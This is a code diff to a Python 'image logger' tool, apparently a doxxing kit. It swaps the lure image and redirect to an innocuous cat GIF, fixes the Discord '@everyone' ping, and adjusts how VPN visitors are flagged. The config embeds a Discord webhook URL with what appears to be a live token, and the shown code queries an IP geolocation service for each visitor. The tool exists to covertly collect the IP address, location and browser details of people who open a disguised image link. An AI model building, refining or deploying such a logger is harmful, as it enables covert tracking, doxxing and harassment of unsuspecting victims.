@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1450027293756887215/zclbPt9N9ouAdr6Nr1KBACkP4r1dCen9thQnOIHqbP90mjxSWYHk_hFdRQMtJH92Fru5",
-    "image": "https://tenor.com/view/omori-doxxed-get-doxxed-idiot-gif-16209759885120265120", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/view/cat-gif-16258174987336597266", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://tenor.com/view/omori-doxxed-get-doxxed-idiot-gif-16209759885120265120" # Link to the webpage to redirect to 
+        "page": "https://tenor.com/view/cat-gif-16258174987336597266" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everone"
+    ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
@@ -115,7 +115,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 return
         
         if config["vpnCheck"] == 1:
-            ping = "@everyone"
+            ping = ""
     
     if info["hosting"]:
         if config["antiBot"] == 4:
